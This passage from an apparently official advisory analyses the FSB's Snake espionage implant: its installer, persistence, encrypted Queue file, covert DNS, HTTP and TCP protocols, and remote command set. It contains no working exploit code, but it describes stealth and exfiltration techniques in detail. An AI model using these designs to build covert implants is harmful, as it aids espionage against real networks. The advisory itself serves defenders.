Typically, after FSB operators map out a network and obtain administrator credentials for various domains in the network, regular collection operations begin. In most instances with Snake, further heavyweight implants are not deployed, and they rely on credentials and lightweight remote-access tools internally within a network. FSB operators sometimes deploy a small remote reverse shell along with Snake to enable interactive operations. This triggerable reverse shell, which the FSB has used for around 20 years, can be used as a backup access vector, or to maintain a minimal presence in a network and avoid detection while moving laterally. 
Snake Architecture
Snake’s architectural design reflects professional software engineering practices. Critical pathways within the implant are made of stacks of loosely coupled components that implement well-designed interfaces. In addition to facilitating software development and debugging, this construction allows Snake to use multiple different components for the same purpose, choosing the specific component based on environmental considerations. For example, Snake’s custom network communications protocols function as a stack. All implementations use an encryption layer and a transport layer, such as Snake’s custom HTTP or raw TCP socket protocol. Each layer of the Snake network protocol stack solely implements a specified interface for operability with the two adjacent layers. The encryption layer and underlying transport layer thus function independently, so any custom Snake network protocol can employ an encryption overlay without any change to the encryption layer code. 
This modularity allows Snake operators to choose the most logical network transport for the given environment without affecting Snake’s other functionality. When using a compromised HTTP server as part of the Snake P2P network, the operators can ensure that all traffic to this machine follows the Snake custom HTTP protocol and thereby blends effectively with legitimate traffic. In the context of a compromised machine that legitimately allows secure shell (SSH) connections, Snake can utilize its custom raw TCP socket protocol instead of its custom HTTP protocol. All other layers of the Snake protocol stack, from the immediately adjacent transport encryption layer to the distant command processing layer, can and do remain entirely agnostic to the transport layer as long as it implements its interface correctly. This architecture also allows the Snake developers to easily substitute a new communications protocol when they believe one has been compromised, without necessitating any downstream changes in the code base. Lastly, this design facilitates the development of fully interoperable Snake implants running on different host operating systems.
Snake’s technical sophistication extends from the software architecture into the lower-level software implementation. Original versions of Snake were developed as early as 2003, before many of the modern programming languages and frameworks that facilitate this type of modular development were available. Snake is written entirely in C, which provides significant advantages in low-level control and efficiency, but which does not provide direct support for objects or interfaces at the language level and provides no assistance with memory management. The developers of Snake successfully implemented the implant’s complex design in C with very few bugs, including careful avoidance of the common pitfalls associated with null-terminated strings and the mixing of signed and unsigned integers. Additionally, the developers demonstrate an understanding of computer science principles throughout the implant’s implementation. This includes selecting and correctly coding asymptotically optimal algorithms, designing and utilizing efficient custom encoding methodologies that closely resemble common encoding schemes, and handling the numerous possible errors associated with systems-level programming in a secure manner.
Capitalizing on Mistakes
Although the Snake implant as a whole is a highly sophisticated espionage tool, it does not escape human error. A tool like Snake requires more familiarity and expertise to use correctly, and in several instances Snake operators neglected to use it as designed. Various mistakes in its development and operation provided us with a foothold into the inner workings of Snake and were key factors in the development of capabilities that have allowed for tracking Snake and the manipulation of its data.
The FSB used the OpenSSL library to handle its Diffie-Hellman key exchange. The Diffie-Hellman key-set created by Snake during the key exchange is too short to be secure. The FSB provided the function DH_generate_parameters with a prime length of only 128 bits, which is inadequate for asymmetric key systems. Also, in some instances of what appeared to be rushed deployments of Snake, the operators neglected to strip the Snake binary. This led to the discovery of numerous function names, cleartext strings, and developer comments as seen in the following figure.

 


SNAKE HOST-BASED TECHNICAL DETAILS
The FSB has quickly adapted Snake when its capabilities have been publicly disclosed by private industry. Snake therefore exists in several variants, as it has evolved over almost 20 years. This CSA focuses on one of the more recent variants of Snake that up until now has not been widely disclosed. Older variants of Snake will be discussed briefly where applicable, but not discussed in depth, as many details of earlier Snake variants already exist in the public domain.
Installer
The Snake installer has gone by various names throughout Snake’s existence (e.g., “jpinst.exe”). This advisory will describe the version of the installer which regularly used the name “jpsetup.exe”. This executable is packed using a customized obfuscation methodology. The developers appear to have added the unpacking functionality from an open source project for viewing JPEG files. This technique serves to obfuscate the unpacking code within an otherwise legitimate code base.  The unpacking code extracts an executable, herein referred to as the “Png Exe”, and it extracts an AES encrypted blob from the Png Exe’s resources, which herein will be referred to as the “Png Resource”. 
The jpsetup.exe installer requires two arguments to be passed via the command line for execution. The first argument is a wide character string hashed with SHA-256 twice, and the resulting value of these computations becomes the AES key that decrypts the Png Resource. The AES initialization vector (IV) consists of the first 16 bytes of the second argument to jpsetup.exe after prepending the argument with a wide character “1” string. Once decrypted, the Png Resource becomes an executable that will be referred to herein as “Stage 2”. 
When unpacked, many components are extracted from Stage 2’s resources. Several of the resources are executables with additional resources of their own. Stage 2 creates structures from its resources, which ultimately become the host artifacts of Snake.
On-Disk Components
As Windows has been the most prevalent operating system targeted by Snake, this document will only discuss the Windows-based artifacts; however, Snake can be cross-compiled and is capable of running on other operating systems.
On-Disk Obfuscation
Snake’s host architecture and network communications allow an unusual level of stealth. Snake makes inventive use of its kernel module in both of these contexts. All known Windows versions of Snake have used a concealed storage mechanism to hide host componentry. In addition to using the kernel module to remove the relevant components from any listing returned by the operating system, Snake utilizes the kernel module to mediate any requests between Snake’s user mode components and the concealed storage mechanism, which itself is encrypted with a unique per-implant key. This unique keying creates detection difficulties even for tools that are independent of the compromised operating system, since simple signatures targeting Snake host components would be ineffective. 
Persistence Mechanism
The Snake version primarily discussed in this advisory registers a service to maintain persistence on a system. Typically, this service is named “WerFaultSvc,” which we assess was used to blend in with the legitimate Windows service WerSvc. On boot, this service will execute Snake’s WerFault.exe, which Snake developers chose to hide among the numerous valid Windows “WerFault.exe” files in the %windows%\WinSxS\ directory. Executing WerFault.exe will start the process of decrypting Snake’s components and loading them into memory. 

 


Encrypted Registry Key Data
Upon execution, Snake’s WerFault.exe will attempt to decrypt an encrypted blob within the Windows registry that is typically found at HKLM:\SOFTWARE\Classes\.wav\OpenWithProgIds. The encrypted data includes the AES key, IV, and path that is used to find and decrypt the file containing Snake’s kernel driver and kernel driver loader. The registry object’s structure can be seen on the right side of the following figure. Snake uses Microsoft Windows Cryptography API: Next Generation (CNG) key store to store the AES key needed to decrypt the registry object.

 


Kernel Driver and Custom Loader
Snake’s installer drops the kernel driver and a custom DLL which is used to load the driver into a single AES encrypted file on disk. Typically, this file is named “comadmin.dat” and is stored in the %windows%\system32\Com directory. The structure of this file can be seen on the left side of the figure above. The key, IV, and path to comadmin.dat are stored in the encrypted registry blob. 
The Queue File
The last host-based artifact to discuss is the Queue File. Typically, this file has been found within the %windows%\Registration directory with the format of <RANDOM_GUID>.<RANDOM_GUID>.crmlog, and is decrypted by Snake’s kernel driver. Due to the complexity and importance of the Queue File, its details are discussed at length in the following subsection. 
The Queue
The Queue is a Snake structure that contains various pieces of information, including key material, communication channels, modes of operation, the principal user mode component, etc., that Snake requires for successful operation. It should be noted that this is a name used by the developers and is not equivalent to a “queue” in the normal context of computer science. The Queue data is saved on disk in the Queue File, which is a flat file with a substructure that includes a 0x2c-byte file header followed by data blocks. Each data block corresponds to exactly one Queue Item, which could be, for example, a simple configuration parameter, a Snake command, or an entire embedded executable. Each Queue Item is associated with a specific Queue Container.
Queue Containers and Items
Each Container is identified by its Type and Instance values. Each Container Type holds the same type of information used by the Snake implant for a specific purpose. The following table shows the various Container Types and their functions. A Queue can have multiple Containers of the same Type, but each of these Containers will have different Instance values.

 


The data in each Container in the Queue is separated into Queue Items with the 0x40-byte metadata structure shown in the following table. The data content of the Queue Item immediately follows this structure. The Queue Items in each Container are distinguished by their corresponding Item Number as well as their Item Type identifier. The Item Number is assigned by the Snake implant itself, while Snake operators generally refer to the Item Type value when trying to reference a specific item.

 


Queue File Encryption
In previous versions of Snake, the Queue File existed within an encrypted covert store. The data belonging to the Queue Items themselves were also CAST-128 encrypted. In more recent versions, the covert store was removed, and the Queue File exists by itself on disk. The Queue Items inside the Queue File are still encrypted with CAST-128, and in addition, the full Queue File is also CAST-128 encrypted. The CAST keys used to encrypt the Queue Items within a Container Instance can be found in that Instance's corresponding 0x2 Container as Item Type 0x229 (see below). The key and IV used to encrypt the Queue File can be found by decoding strings within Snake’s kernel driver.
Container Descriptions
0xb Container
The 0xb Container lists the available modes of operation for a given Snake implant. When using a certain mode, Snake uses a specific set of Containers and communication channels. Each infection can use up to four different modes. Each mode in the 0xb Container will have a Container Instance value that all Containers associated with this mode will use, except for the 0x3 Container. 

 


0x0 Container
The 0x0 Container handles incoming commands/data for the host of the Snake infection. Commands will be queued in this Container until the implant is ready to execute them.
0x1 Container
The 0x1 Container handles outbound commands/data for the host of the Snake infection. The data will be queued within the 0x1 Container until the implant is ready to exfiltrate them.
0x2 Container
The 0x2 Container holds the configuration information for the mode to which it corresponds. Various pieces of information vital to Snake’s successful operation are stored within these Containers. This subsection will discuss a subset of the parameters that can be found within the 0x2 Container.

 


Pivotal key information can be found within the 0x2 Containers. This includes the inbound and outbound RSA keys (Items 0x228 and 0x227, respectively), the CAST key (Item 0x229) used to encrypt the individual items within the Queue Container, pre-shared keys used for the top layer of encryption in Snake’s network communication protocol, and a quasi-unique value for the implant, called the “ustart” value, needed for Snake network connectivity.
Snake is constantly passing data between its kernel and user mode components. The methodology (generally, named pipes) used to make these communications is listed in Items 0x65-0x6f of the 0x2 Container. Items 0x70-0x7a list the parameters necessary to establish these communications. 
Items 0xc9-0xd3 contain details of up to ten other Snake infections, referred to as “communication channels”, which the implant can communicate with during Passive Operations. The parameters needed to establish Snake sessions with the other hosts can be found in Items 0xd4-0xde.
Many additional data points, such as the process name where Snake injected itself or the modules Snake has loaded from its 0x3 Container, can be found within 0x2 Containers.
0x3 Container
The 0x3 Container houses embedded files and modules for Snake. A single 0x3 Container will be accessible to all Containers in the Queue. The 0x3 Container has its own dedicated 0x2 Container that only includes a single Queue Item of Item Type 0x229 (a CAST-128 key). This key will be used to encrypt and decrypt all of the embedded files and modules within the 0x3 Container.

 


The Item Types assigned to the embedded files and modules within the 0x3 Container are consistent across all of the Snake infections within Snake’s P2P network. For example, the 0x01 Item Type is the Zlib library, and therefore any time an Item Type of 0x01 is seen within the 0x3 Container of a Snake infection, that file is always the Zlib library. The implant’s 0x2 Container will keep track of libraries that it has loaded. If the DLL is a file on disk, the full path to the DLL is saved in the 0x2 Container. If the library was loaded from a 0x3 Container, the loaded module will be displayed in the implant’s 0x2 Container in the format “&<Item Type (within 3 container) of loaded module>”. 
0x4 Container
The 0x4 Container logs command activity. Each Queue Item within the Container is a log of a single executed or attempted command. Each mode will have its own corresponding 0x4 Container.
0x5 Container
The 0x5 Container holds Snake network logs, noting any IP address that has connected to this implant. Some versions of Snake no longer make use of this Container.
0x6 Container
The 0x6 Container saves commands that are set to execute at specific times. A Queue Item is created for each scheduled command.
0x7 Container
The 0x7 Container logs the IP addresses of any other Snake implants that have connected to this implant during Passive Operations. The commands 0x79 (Read Agents Track) and 0x7a (Clear Agents Track) are used to interact with this Container. Note that the command 0x7a had been deprecated in some versions of Snake and returns the error “function unsupported” if called.
SNAKE NETWORK COMMUNICATIONS
Snake’s network communications are encrypted, fragmented, and sent using custom methodologies that ride over common network protocols, including both raw TCP and UDP sockets and higher-level protocols like HTTP, SMTP, and DNS. Snake’s protocols for HTTP and TCP are the most commonly seen, but functionality exists for UDP, ICMP, and raw IP traffic. Snake’s network communications are comprised of “sessions”, which are distinct from the sessions associated with the legitimate protocol it is riding on top of (e.g., TCP sessions). The Snake session is then comprised of distinct commands. Both Snake’s custom transport encryption layer (“enc”) and Snake’s Application Layer have their own encryption mechanisms, where the enc layer operates on an individual P2P session and the Snake Application Layer provides end-to-end encryption between the controller (i.e., point of origin) and the command’s ultimate destination. The following figure details Snake’s communication protocol stack. 

 


Network Obfuscation
Snake’s use of its kernel module also facilitates stealthy network communications. To participate fully in Snake’s P2P network, implanted machines which are not the ultimate target must act as servers for other Snake nodes. Snake’s kernel module, along with a thoughtfully designed mechanism for distinguishing Snake traffic from legitimate client traffic, allows the implant to function as a server in the Snake P2P network without opening any new ports, greatly complicating detection efforts. Additionally, Snake’s custom network communication protocols are designed to blend with traffic that the compromised server normally would receive. This allows Snake operators to use legitimate servers as infrastructure, which reduces the effectiveness of simple IP address or domain blocking without needing to open new ports or send unusual looking traffic to this infrastructure. 
Snake’s Network Authentication Technique (“ustart”)
Snake uses its custom HTTP and raw socket TCP based protocols for large data communications.  With these protocols and others, Snake employs a specific authentication mechanism to distinguish Snake traffic from legitimate traffic destined for application software on the compromised server. This technique enables one of the uniquely sophisticated aspects of Snake, which is its ability to function effectively as server software without opening any further ports on the compromised system. The relevant per-implant authentication value is referred to as the “ustart” and is stored in the implant’s Queue File. There are multiple forms of the ustart value, including “ustart”, “ustart2”, and “ustartl”. 
Rather than open a listening socket on a specified TCP port, the Snake kernel module intercepts the first client-to-server packet following the 3-way handshake in every TCP session. The kernel module then determines whether or not the contents of that packet are in fact valid for the ustart value of that target Snake implant. If so, the Snake kernel module forwards that packet and any future packets in the same TCP session to Snake’s own processing functionality, and the (presumably legitimate) application listening on that port remains unaware of this TCP session. If not, the Snake kernel module allows the packet—and the rest of the TCP session as it occurs—to reach the legitimate listening application, for example web server software. See the following for an illustration. 

 


All of the ustart versions perform authentication by sending a random nonce along with data that comprises a mathematical operation on the combination of the nonce and the ustart value itself. The receiving machine then extracts the nonce and performs the same computations to authenticate the sending machine. The ustart2 and ustartl versions use the Fowler-Noll-Vo (FNV) hash algorithm to generate the overall authentication value from the nonce and the ustart. This mechanism is slightly different in the custom Snake HTTP protocol versus the custom Snake TCP protocol.
Using the ustart methodology, a node in the Snake P2P network can function as a server without opening any otherwise closed ports and without interfering in the compromised server’s legitimate functionality. Snake will only communicate over TCP ports on which another application is actively listening. This technique makes detecting Snake compromises through network traffic monitoring far more difficult. Inbound traffic to an unexpected TCP port can be detected or blocked using standard firewall or network intrusion detection functionality. Replacing a legitimate service application with a modified executable can lead to detection at either the host or network level. Snake’s technique bypasses both of these mitigations. When combined with the fact that Snake traffic looks similar to expected traffic, especially in the case of Snake’s HTTP based protocols, this renders detecting Snake communications difficult absent detailed knowledge of Snake’s custom protocols.
Snake UDP
Outbound Communications via DNS Query
Snake uses a specialized communications protocol to encode information in seemingly standard DNS queries run via the Windows or POSIX API function gethostbyname, depending on the version. Snake outbound DNS requests consist of character strings that are constructed to resemble standard domain names. The actual information being transmitted from the implant is contained in the part of the character string prior to the first ‘.’ character. For illustration purposes, this subsection will outline how an arbitrary string of bytes is manipulated and then encoded to form an outbound Snake DNS request carrying data provided by the implant.
Snake outbound DNS requests originally take the form of byte arrays stored on the stack as the implant progresses through the communications function. The byte array has the following structure.

 


Only the low-order seven bits of the flags byte are used, and they have the following significance.

 


After calculating and obfuscating the byte array values shown above, Snake encodes these byte values as de-facto base32 text, using the ten digits 0-9 and the 26 lowercase ASCII letters a-z, with v, w, x, y, and z all corresponding to the same value, as only 32 distinct characters are needed. Snake then inserts ‘-‘ characters at specified locations and sends the DNS request using the gethostbyname function. The resulting encoded string mimics a legitimate DNS request; because characters after the first ‘.’ are not part of the implant’s communications, any arbitrary suffix (e.g., “.com”) can be used. 
Inbound Communications via DNS Query Response
After sending the encoded DNS request, Snake parses the returned information. In a normal DNS request, the returned hostent structure contains a list of IPv4 addresses as 32-bit unsigned integers if the domain resolves to one or more IPv4 addresses. In the Snake DNS protocol, these 32-bit integers represent the covert channel data. The Snake implant sorts the 32-bit integers by the highest order nibble and then interprets the remaining 28 bits of each integer as the actual encoded data. The Snake DNS protocol thus provides a well-concealed, low-bandwidth communications channel.  For larger bandwidth communications, Snake uses its custom HTTP and TCP protocols.
Snake HTTP
The most common custom protocol that Snake uses is its “http” protocol, which rides on top of standard HTTP. It generally looks like normal HTTP communications, including a lot of base64-looking strings, thus blending well with normal network traffic. There have been multiple iterations of Snake’s http protocol, though the differences are only in the encoding; once that is peeled away, the underlying Snake http protocol is the same. For the purposes of this document, Snake’s former version of HTTP will be referred to as “http” and its more recent version as “http2”. 
Snake communications using http2 are contained within seemingly legitimate Application Layer HTTP communications. In the client-to-server direction, the implant data is contained within an HTTP header field of a GET request, unless the data is over a certain size (usually 256 bytes, but configurable). Observed field keys have included: Auth-Data, Cache-Auth, Cookie, and Cockie (note misspelling). This list is not exhaustive; any standard HTTP header field can be used. The communication itself is contained in the legitimate HTTP header field’s value, meaning the content following the ‘:’ character and any whitespace immediately thereafter. In HTTP GET requests, the implant generally uses the default path ‘/’, but this is not required and is configurable. Larger client-to-server Snake http2 requests are contained in the body of an HTTP POST request, and server-to-client communications are contained in the body of the HTTP response.
All client-to-server Snake http and http2 requests begin with the ustart authentication. The specifics vary with each ustart version, but in each case the random nonce and the computed function of the nonce and ustart value are encoded in a manner which closely resembles the rest of the Snake communication. Since Snake http and http2 implant sessions can span multiple TCP sessions, the ustart authentication mechanism is included in every client-to-server communication.
Base62 Encoding
Snake’s http2 protocol uses a custom base62 encoding scheme that has the following differences from base64. Base62 uses 62 semantically significant characters instead of 64. The ratio of encoded-to-decoded characters in base62 is less dense (11:8) than the ratio base64 can achieve (12:9). Also, base62 uses extraneous characters in certain instances that have no semantic significance. 
The base62 characters of semantic significance are the 62 strict alphanumeric characters:,0-9A-Za-z,. The extraneous characters that can be present in a base62 string—but which have no semantic significance—are: ‘/’, ‘;’, ‘=’, and ‘_‘ (underscore). When present, these characters are removed prior to performing the decoding process. A valid base62 string can have up to 11 of these extraneous characters. A regular expression for base62 is included in the Mitigations section of this CSA.
http and http2 Metadata Structure
After the base62 decoding is completed, if necessary, the remaining data begins with an 8-byte metadata structure that provides rudimentary sessionization on top of the stateless HTTP. Snake’s http and http2 client-to-server communications have three de-facto parts, which are concatenated into a single HTTP header value. These parts are: 1) an announce or authentication string, 2) a custom metadata structure, and 3) payload data. The metadata structure consists of the following:
struct http_meta {        uint32_t session_number;        uint16_t communication_number; uint8_t flags; uint8_t checksum; };
Snake uses the session_number and communication_number fields to provide its own custom sessionization on top of the stateless Application Layer HTTP protocol. The checksum byte serves to validate the integrity of the structure and must equal the sum of the first seven bytes modulo 256.
Snake TCP
Snake has the ability to communicate through POSIX-style TCP sockets. The implant’s custom TCP protocol, which herein will be called “tcp”, uses the reliability features of the underlying TCP protocol.  Thus, in the implant’s custom tcp protocol, the concept of a TCP session and an implant “session” are the same, whereas in the implant’s custom http protocols, one implant session could span multiple Transport Layer TCP sessions. Since the implant’s overall communications protocol is based on the idea of commands and responses, Snake depends on being able to specify the length of any given command and response so the recipient Snake node knows when a particular communication ends. Snake achieves this in the custom tcp protocol by prefacing each communication with its length encoded as a 32-bit big-endian unsigned integer. 
Immediately following the TCP 3-way handshake, the implant completes the ustart authentication for this session. Since Snake tcp sessions are mapped one-to-one with an underlying protocol TCP session, the ustart authentication only occurs once per session, rather than with each client-to-server communication as in Snake http and http2. The Snake tcp ustart mechanism is similar to the Snake http and http2 mechanisms, except that for certain ustart versions, Snake tcp uses a raw binary ustart which is not encoded in printable characters.
After the ustart authentication, the implant will begin sending length-data pairs. These pairs can be sent in the same packet or in two (or theoretically more) separate packets, but the pattern of length-data pairs will be present in each half of the stream (i.e., each direction) for the entirety of the implant communications for the remainder of the TCP session. Specifically, a length-data pair will consist of the length encoded as a big-endian 32-bit unsigned integer followed by data of exactly that length. For example, consider the instance where the implant is sending the following 4 arbitrary bytes: 
89 ab cd ef
The on-wire communication from the implant would send the integer value 4 encoded as a big-endian 32-bit integer, followed by the actual 4 bytes themselves, as shown below. This could be split across two (or theoretically more) packets.
00 00 00 04 89 ab cd ef
The custom tcp protocol (as well as all custom http protocols) have been used in conjunction with the Snake enc protocol. Details of the Snake enc protocol are provided in the following subsection. Due to the manner in which the Snake enc and Snake tcp protocols interact, the first six length-data pairs of each TCP half-stream (following the single client-to-server announce or authentication packet described above) will have known lengths. Specifically, each half-stream will begin with length-data pairs of the following lengths: 0x8, 0x4, 0x10, 0x1, 0x10, 0x10. Note that these are the lengths of the raw data, so each communication will be preceded by a 4-byte big-endian integer specifying the corresponding length. Thus, one of the half-streams could have the following TCP content:
00 00 00 08 12 34 56 78 9a bc de f0 00 00 00 04 89 ab cd ef 00 00 00 10 12 34 56 78 9a bc de f0 12 34 56 78 9a bc de f0 00 00 00 01 12 00 00 00 10 12 34 56 78 9a bc de f0 12 34 56 78 9a bc de f0 00 00 00 10 12 34 56 78 9a bc de f0 12 34 56 78 9a bc de f0
Snake “enc” Layer
As described above, Snake communications are all comprised of “Snake sessions”, irrespective of whichever legitimate protocol Snake is operating on top of. Snake’s top layer of encryption, called the enc layer, utilizes a multi-step process to establish a unique session key. The session key is formed through the combination of a Diffie-Hellman key exchange mixed with a pre-shared key (PSK) known to both parties. This PSK is stored in one of the communication channels, stored within the Queue. 
The overall establishment of the session key requires 12 communication steps, six in each direction, which involve sharing the pseudo-random values used in the Diffie-Hellman exchange process as well as custom aspects of the Snake session key derivation method. The session key is used to encrypt the command headers and (inner) encrypted payloads.
This is the layer in which the critical error of providing a value of 128 bits instead of 128 bytes for the call to DH_generate_parameters within the OpenSSL library occurred. Due to this insufficient key length, breaking the Diffie-Hellman portion of the exchange is possible. Note that in the following figure, the variables ‘p’, ‘g’, ‘a’, and ‘b’ are used in standard descriptions of Diffie-Hellman.

 


SNAKE APPLICATION LAYER
Snake’s Application Layer is used to process Snake commands. The payload data for a Snake session can contain one or more command exchanges, which include both the incoming data sent to the implant as well as the response returned to the server. Each command is associated with a specific ordinal, and due to Snake’s modular design, operators are able to add new commands to extend Snake’s capabilities by remotely loading a new module.
The Snake implant differentiates between High and Low commands and handles them differently, based on the ordinal number range. The majority of Snake commands are High commands that have an ordinal of 0x64 (100 decimal) or higher. There are far fewer Low commands, and these include the Forwarding command (with ordinal 0x1), and the four Queue commands (with ordinals 0xa, 0xb, 0xc, and 0xd). While Low commands are mostly used for moving data across the network, the High commands give the operator many options for interacting with an infected system. 
Command 0x15-byte Header
All commands begin with a 0x15-byte header, followed by optional command parameter data; only some commands require parameters for successful execution. For example, the command Get, which exfiltrates a file, requires the name of the file to exfiltrate, whereas the command Process List, which returns a process listing, does not require any parameters. 
The most important Command Header field contains the integer ordinal of the command being sent. The Item UID field represents a unique identifier for each individual command instance, and these values increase sequentially. The header has two fields used when a command is set to run at a specified date and time; these commands will be written to the 0x6 Container.
Some Low commands have another header before the payload data, which will be detailed below. All other commands have only the Command Header followed by the encrypted parameter data.

 


Command Encryption
Underneath Snake http2 or tcp encryption at the session layer, each command exchange is further encrypted. In older versions of Snake, the exchanges were CAST-128 encrypted using a different key for incoming and outgoing data. These keys were saved in the 0x2 Container in the 0x227 and 0x228 Items. The incoming payload data, if parameter data was present, could be decrypted with the 0x227 CAST key. Any response data was encrypted with the 0x228 CAST key. 
In recent versions, the 0x227 and 0x228 Items hold two RSA-4096 public keys. For each side of an exchange, a new 16-byte CAST key is created with Microsoft’s CryptoAPI CryptGenRandom function to obtain 16 random bytes. This key is used to CAST-128 encrypt the parameter or response data.
For an incoming command, the CAST key is signed (not encrypted) by the private key corresponding to the public key on the node to create a 512-byte RSA data blob. The incoming payload has the RSA blob, followed by the optional parameter data, which is CAST-128 encrypted. Snake uses the 0x227 RSA public key to decrypt the RSA blob, recover the CAST key, then decrypt the parameter data.
For an outgoing command, a new CAST key is obtained from CryptGenRandom, and any response data is CAST-128 encrypted. The key is then encrypted using the 0x228 public key to create a 512-byte data blob. The response payload data contains the 512-byte RSA blob, followed by the encrypted response data, when present.
Command Decoding
The implant will expect data in a specific format for each command ordinal. Parameter and response data contain several possible underlying data types, including wide-character plaintext strings, numeric values, data tables, files, or a combination of multiple types. 
The parameter data buffer itself will be formatted in a specific way, depending on the command ordinal. Some commands have required parameters, as well as optional parameters. Commands with optional parameters will include a metadata header with the data length and data type (e.g., bool, integer, text, or data buffer) before the optional parameter’s data. Other commands will expect the parameters to be formatted with length-data pairs, consisting of the parameter data length encoded as a four-byte big-endian integer followed by data of exactly that length. Still other commands have a custom header or will expect no length or metadata and will simply send the parameter data alone.
The response data will similarly be formatted by the implant in a specific way according to the command ordinal. The response data typically does not have a length or metadata preceding it, with the exception of the data tables. Examples of commands that return a table are the Process List command and the List Dir command.
Response data that includes a table will start with a table description header that indicates the number of columns and rows in the table. In addition, the header will include a Column Descriptor structure to indicate the type of data that column will contain, for example a string, uint32 or uint64, timestamp in epoch format, or the contents of a whole file (included as a table entry).
After the table description header, each field is added to the data payload buffer one at a time in a length-data pair. The fields across the first row are added in order, then the fields across the second row are added immediately after the first row with no metadata or separation, and so on. To parse this table, the server will account for the number of columns to determine where the next row starts.
High Commands
High commands are those with an ordinal of 0x64 (decimal 100) or higher. High commands give the operator many options for interacting with an infected system, as well as implant components. This subsection will describe some examples of the many High commands that can exist in the implant.
Some of the most basic High commands will gather information about the machine and return the results. For example, the FSB operators can use the PS command (0x65) to return a list of running processes, the List Dir command (0x840) to list the contents of a directory, or the Syst command (0x6b) to gather basic system information.
There are several commands that interact with the infected machine using standard built-in OS tools. The operator can use the Kill command (0x67) to kill a process, the Get command (0x68) to exfiltrate a file, the Put command (0x69) to write a file, the Del command (0x6a) to delete a file, or the Run command (0x66) to execute a command in a terminal shell and receive the results. For example, operators have used the Run command to run PowerShell commands, ping other hosts, use the Windows “net use” command to map network drives, and to run executable files that had been previously written to the node using the Put command.

 


In addition to commands that use the built-in OS functionality, there are several High commands that interact with Snake components. An operator can use the Read Config command (0x70) to read the 0x2 Container, which contains configuration data, or the Set Config Item command (0x71) to set a specific Queue Item within the 0x2 Container. For example, operators have used the Set Config Item command to add or update the IP addresses or domains and option parameters used to communicate with other Snake nodes. The Read Agents Track and Clear Agents Track commands (0x79 and 0x7a) interact with the 0x7 Container to read or delete logs which track which other Snake nodes have connected to this node. Note that the 0x7a command has been deprecated in some versions of Snake and returns the error “function unsupported” if called.
Snake has the ability to add additional commands by loading new modules. New modules can be loaded using the Load Modules command (0x72) or directly into memory using the Load Modules Mem command (0x7f). When compiling a module, the developer will assign an ordinal to each constituent command, which will then be used by the operator to call the newly added commands. These loaded modules can be removed using the Module Unload command (0x73).
Queue Commands
Queue Command Header
The four Queue commands contain a 0x3d-byte Queue Header following the Command Header. In more recent versions of Snake, this header is encrypted using the same CAST key used to encrypt the payload data. In this case, the Command Header is followed by the 512-byte RSA encrypted CAST key blob, the encrypted Queue Header, and finally the encrypted payload data.

 


Even though each of the four Queue commands only use a subset of the fields of the Queue Header (in different ways), the full header must be present for the command to be considered valid by the implant. Two fields in the header that all four Queue commands use are the Container Instance and Container Type fields, which indicate the specific Container on a node the Queue command intends to interact with. In the Queue Read and Write commands, the Item Type field is used to track the specific commands and their responses in the Containers.
Queue Enumerate Command
The Queue Enumerate command, with ordinal 0xa, is used to enumerate the contents of the 0x0 or 0x1 Containers to list all incoming or outgoing commands, respectively. The enumeration returns the 0x40-byte structure described above for each Queue Item, concatenated into a single return buffer.
Queue Read Command
The Queue Read command, with ordinal 0xb, is used to read an Item from the specified 0x0 or 0x1 Container. Several relevant fields in the Queue Header determine how the data is sent and stored. For example, the header determines whether the data should be sent immediately back to the server or stored for later transport. The header indicates if the implant should send the Queue Item’s header (i.e., the same 0x40-byte metadata structure returned by the 0xa command), the Item’s data, or both. The header also indicates whether the Queue Item should be deleted after being read and can also indicate that Queue Items with a lower Item Type should be deleted. This allows FSB operators to clear out all command Items previous to the one being read.
Queue Write Command
The Queue Write command, with ordinal 0xc, is used to write a Queue Item to the specified 0x0 or 0x1 Container. The Queue Header will indicate if a new Queue Item will be created, or an existing Queue Item will be modified.
If a Queue Item is set to be modified, an Item with the specified Item Type must exist in the specified Container. Several fields in the header must match specific attributes of the existing Queue Item. If these checks are met, the parameter data is written to the Queue Item. Fields in the Queue Header will indicate the length of data to be written, and the offset into the existing Queue Item where the write should begin.If a Queue Item is set to be created, Snake will delete existing Queue Items of the specified Item Type in the Container of interest, then create a new Item of the specified Item Type and write the parameter data to the Queue Item. A field in the Queue Header will indicate the length of data to be written.
Queue Delete Command
The Queue Delete command, with ordinal 0xd, is used to delete a Queue Item from the specified 0x0 or 0x1 Container. The Flags field will determine if the single Queue Item should be deleted, or if all Queue Items with a lower Item Type should be deleted as well.
Forward Commands
Forward commands, with command ordinal 0x1, are used to tell an implant to forward a Snake command to a second target node, where the command will be executed. The target node sends the response data back to the first implant, which will then package that response data as its own response back to the caller.
The command is designed to tell an implant to forward one command to another implant, but in practice, Forward commands are often built on top of each other to create a chain of hop points that will continue to forward a command to an end point, where it will be executed. The response data is then sent back through the same chain of hop points until it reaches the operator.
The Forward command has a 0x199-byte Forward Header, followed by the encrypted command parameter data that will be sent to the target node of the Forward command. The Forward Header contains the information the implant will need to connect to the target node, including the ordinal of the Snake command that is being forwarded to the target node for execution.
The implant that receives the Forward command will construct a new Snake command of the ordinal indicated in the Forward Header. It will connect to the target node in a new session, construct the Command Header, and send the encrypted command parameter data on to the target node. The parameter data already will have been encrypted using the key associated with the target node, so that the target implant will be able to decrypt the parameter data and execute the command. 
When the Forward command is constructed, the CAST key used to CAST-128 encrypt the payload data—to include the 0x199-byte header and the parameter data to be forwarded—is encrypted with the RSA key pair used by the first implant. The parameter data that contains the parameters for the command to be forwarded is also CAST-128 encrypted, but the key used to encrypt the parameter data is encrypted with the RSA key pair used by the target node. The first implant knows through the header what command ordinal it is forwarding, but it is unable to decrypt the parameter data.
If the Forward Header sent to the first implant indicates that the command to be forwarded was another Forward command, the first target node will decrypt the parameter data and find another Forward Header. This first target node implant will then go through the same process to connect to the next target node, constructing the new command with the ordinal indicated in the second Forward Header to send the remaining encrypted parameter data to the next target node. This will repeat until the command to be forwarded is something other than another Forward command.
The Command Header and pertinent parameters for each target node are encrypted specifically for that node by the operator before the Forward command is sent into the Snake P2P network. To illustrate, the diagram below shows how the buffer might look when several Forward commands are chained together to include two hop points and an end point. The first hop point (HP1) will recover the first CAST key and CAST-128 decrypt the rest of the buffer, which will uncover the first Forward Header. HP1 will then forward the remainder of the decrypted buffer to the next hop point (HP2), starting with the second CAST key blob. HP2 will recover the second CAST key and CAST-128 decrypt the rest of the buffer, which will uncover the second Forward Header. HP2 will then forward the remainder of the decrypted buffer to the end point, starting with the third CAST key blob. The end point will recover the CAST key, decrypt the command parameter data, and execute the command. 
